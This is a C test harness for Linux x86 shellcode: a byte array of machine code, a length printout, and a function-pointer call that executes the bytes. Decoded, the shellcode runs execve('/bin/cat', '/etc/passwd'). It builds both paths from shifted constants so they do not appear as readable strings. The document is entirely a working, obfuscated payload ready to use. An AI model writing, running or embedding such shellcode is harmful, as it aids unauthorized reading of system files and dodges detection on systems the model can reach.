#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x56\xb1\x10\xbf\x3f\x63\x61\x74\xba\x3f\x62\x69\x6e\x4f\x4a\xe2\xfc\x57\x52\x89\xe3\x51\xbf\x63\x73\x77\x64\xba\x1f\x2f\x70\x61\xbe\x1f\x65\x74\x63\xb1\x10\x47\x42\x46\xe2\xfb\x57\x52\x56\x89\xe1\xb0\x0b\x31\xd2\x52\x51\x53\x89\xe1\xcd\x80"; 



main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
